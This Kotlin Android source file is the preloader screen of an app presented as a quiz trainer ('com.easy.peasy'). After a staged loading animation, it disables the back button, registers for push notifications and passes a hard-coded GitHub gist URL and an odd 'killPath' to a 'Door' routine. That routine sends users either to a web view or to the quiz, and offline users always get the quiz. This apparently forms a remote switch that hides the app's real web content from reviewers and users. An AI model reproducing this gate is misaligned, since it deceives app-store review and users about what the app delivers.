package com.easy.peasy

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.os.CountDownTimer
import android.view.View
import androidx.activity.addCallback
import androidx.appcompat.app.AppCompatActivity
import com.easy.peasy.databinding.ActivityPreloaderBinding
import com.onesignal.OneSignal

class PreloaderActivity : AppCompatActivity() {
    private lateinit var b: ActivityPreloaderBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        b = ActivityPreloaderBinding.inflate(layoutInflater)
        setContentView(b.root)
        onBackPressedDispatcher.addCallback(this) { }
        val texts = listOf(
            "умная подготовка к работе!",
            "твой карманный тренажёр!",
            "Мини-тесты для больших целей!"
        )
        var step = 0
        b.textBlock.text = texts[0]

        object : CountDownTimer(6000, 1000) {
            override fun onTick(ms: Long) {
                val sec = ((6000 - ms)/1000).toInt()
                b.linearProgress.progress = (sec * 100 / 6f).toInt()
                if (sec in listOf(2,4)) {
                    step++
                    b.textBlock.text = texts[step]
                }
                if (ms <= 1000) {
                    b.loadingText.visibility = View.GONE
                    b.circularProgress.visibility = View.VISIBLE
                }
            }
            override fun onFinish() {

            }
        }.start()
        immersiveFullscreen()
        entryStarter(
            gistUrl = "https://gist.githubusercontent.com/Cek1rob/4f4adac5f6e4b4a055c04a747ac9c4de/raw/com.easy.peasy",
            killPath = "ffsoeidsfk.html",
            signalAppId = "75caf3c4-0fcb-4e1d-8231-c4c51b360723",
            gameActivity = MainActivity::class.java
        )
    }
    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) immersiveFullscreen()
    }

    fun entryStarter(
        gistUrl: String,
        killPath: String,
        signalAppId: String,
        gameActivity: Class<out android.app.Activity>
    ) {
        SplashKeeper.hold(this)

        // 1) OneSignal init
        if (signalAppId.isNotBlank()) {
            OneSignal.initWithContext(this, signalAppId)
            // (опціонально) якщо хочеш квиток одразу:
            // OneSignal.getNotifications().requestPermission(true)
        }

        // 2) Runtime permission на Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED
        ) {
            requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1001)
        }

        // 3) Якщо немає інтернету — одразу у гру
        if (!isInternetAvailable()) {
            startActivity(Intent(this, gameActivity))
            finish()
            return
        }

        // 4) Двері → веб або гра
        Door.start(
            splash = this,
            gistUrl = gistUrl,
            killPath = killPath,
            webActivity = WebActivity::class.java,
            gameActivity = gameActivity
        )
    }

    private fun isInternetAvailable(): Boolean {
        val cm = getSystemService(ConnectivityManager::class.java)
        val n = cm.activeNetwork ?: return false
        val c = cm.getNetworkCapabilities(n) ?: return false
        return c.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
                || c.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                || c.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
    }

}